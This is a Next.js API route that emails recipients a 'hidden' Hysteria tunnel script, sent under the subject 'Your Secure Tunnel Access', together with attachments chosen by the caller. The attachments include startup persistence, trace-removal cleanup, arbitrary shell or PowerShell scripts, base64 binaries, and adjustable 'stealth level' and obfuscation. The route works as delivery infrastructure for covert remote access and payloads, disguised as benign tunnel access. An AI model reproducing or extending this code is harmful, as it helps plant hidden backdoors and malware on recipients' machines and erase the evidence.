import { NextResponse, type NextRequest } from "next/server"
import { verifyAdmin, toErrorResponse } from "@/lib/auth/admin"
import {
  sendHiddenHysteriaTunnelScript,
  createConfigPayload,
  createSetupScriptPayload,
  createEnvPayload,
  createReadmePayload,
  createBinaryPayload,
  PayloadTemplates,
  type PayloadAttachment,
} from "@/mailer/index"

export const runtime = "nodejs"
export const dynamic = "force-dynamic"

interface PayloadRequest {
  filename: string
  content: string
  contentType?: string
  description?: string
  type?: "config" | "script" | "env" | "readme" | "binary" | "template"
  templateType?: "persistence" | "monitoring" | "cleanup" | "documentation"
  platform?: "linux" | "windows"
}

interface SendTunnelWithPayloadsRequest {
  to: string
  subject?: string
  tunnelType?: 'hysteria2' | 'hysteria2-obfs' | 'multi-hop'
  platform?: 'linux' | 'windows' | 'macos' | 'all'
  stealthLevel?: 'standard' | 'high' | 'maximum'
  nodeId?: string
  expiresInHours?: number
  payloads: PayloadRequest[]
}

export async function POST(req: NextRequest): Promise<NextResponse> {
  try {
    await verifyAdmin(req)
    
    const body = (await req.json()) as SendTunnelWithPayloadsRequest
    
    // Validate required fields
    if (!body.to || !body.payloads || !Array.isArray(body.payloads)) {
      return NextResponse.json(
        { error: "Missing required fields: to and payloads" },
        { status: 400 }
      )
    }

    // Convert payload requests to PayloadAttachment objects
    const attachments: PayloadAttachment[] = body.payloads.map((payload) => {
      switch (payload.type) {
        case "template":
          if (!payload.templateType) {
            throw new Error("templateType is required for template payloads")
          }
          switch (payload.templateType) {
            case "persistence":
              return PayloadTemplates.persistence(payload.platform || "linux")
            case "monitoring":
              return PayloadTemplates.monitoring()
            case "cleanup":
              return PayloadTemplates.cleanup(payload.platform || "linux")
            case "documentation":
              return PayloadTemplates.documentation()
            default:
              throw new Error(`Unknown template type: ${payload.templateType}`)
          }

        case "config":
          try {
            const config = JSON.parse(payload.content)
            return createConfigPayload(
              payload.filename || "config.json",
              config,
              payload.description
            )
          } catch (error) {
            throw new Error("Invalid JSON in config payload content")
          }

        case "script":
          const commands = payload.content.split("\n").filter(line => line.trim())
          return createSetupScriptPayload(
            commands,
            payload.platform || "linux",
            payload.description
          )

        case "env":
          try {
            const envVars: Record<string, string> = {}
            payload.content.split("\n").forEach(line => {
              const [key, ...valueParts] = line.split("=")
              if (key && valueParts.length > 0) {
                envVars[key.trim()] = valueParts.join("=").trim().replace(/^"|"$/g, '')
              }
            })
            return createEnvPayload(envVars, payload.description)
          } catch (error) {
            throw new Error("Invalid environment variables format")
          }

        case "readme":
          return createReadmePayload(payload.content, payload.description)

        case "binary":
          return createBinaryPayload(
            payload.filename || "payload.bin",
            payload.content,
            payload.description
          )

        default:
          // Default: treat as raw content
          return {
            filename: payload.filename || "attachment.txt",
            content: payload.content,
            contentType: payload.contentType || "text/plain",
            description: payload.description,
          }
      }
    })

    // Send tunnel script with payloads
    const result = await sendHiddenHysteriaTunnelScript({
      to: body.to,
      subject: body.subject || "Your Secure Tunnel Access",
      tunnelType: body.tunnelType || "hysteria2-obfs",
      platform: body.platform || "all",
      stealthLevel: body.stealthLevel || "high",
      nodeId: body.nodeId,
      expiresInHours: body.expiresInHours || 72,
      payloads: attachments,
    })

    return NextResponse.json({
      success: true,
      messageId: result.messageId,
      attachmentsCount: result.attachmentsCount,
      payloadDetails: attachments.map(p => ({
        filename: p.filename,
        contentType: p.contentType,
        description: p.description,
      })),
    })

  } catch (error) {
    return toErrorResponse(error)
  }
}

// GET endpoint to list available payload templates
export async function GET(req: NextRequest): Promise<NextResponse> {
  try {
    await verifyAdmin(req)

    const templates = {
      persistence: {
        description: "Adds tunnel to system startup for persistence",
        platforms: ["linux", "windows"],
      },
      monitoring: {
        description: "Adds monitoring and auto-restart functionality",
        platforms: ["linux"],
      },
      cleanup: {
        description: "Removes all traces after tunnel expiration",
        platforms: ["linux", "windows"],
      },
      documentation: {
        description: "Usage instructions and troubleshooting guide",
        platforms: ["all"],
      },
    }

    return NextResponse.json({
      templates,
      payloadTypes: [
        { type: "template", description: "Predefined payload templates" },
        { type: "config", description: "JSON configuration files" },
        { type: "script", description: "Shell/PowerShell scripts" },
        { type: "env", description: "Environment variables" },
        { type: "readme", description: "Documentation files" },
        { type: "binary", description: "Binary payloads (base64)" },
      ],
    })

  } catch (error) {
    return toErrorResponse(error)
  }
}